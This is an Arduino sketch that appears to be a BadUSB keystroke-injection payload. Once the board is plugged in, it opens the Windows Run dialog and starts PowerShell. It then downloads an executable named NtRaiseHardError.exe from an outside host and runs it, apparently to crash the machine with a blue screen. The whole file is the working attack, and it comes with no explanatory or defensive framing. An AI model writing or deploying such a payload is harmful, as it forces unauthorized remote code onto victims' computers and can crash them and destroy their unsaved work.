#include <Keyboard.h>

void setup() {
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("invoke-webrequest -uri https://app.lzc.app/bsod/NtRaiseHardError.exe -outfile main.exe");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(".\\main.exe");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
}

void loop() {
  // put your main code here, to run repeatedly:
}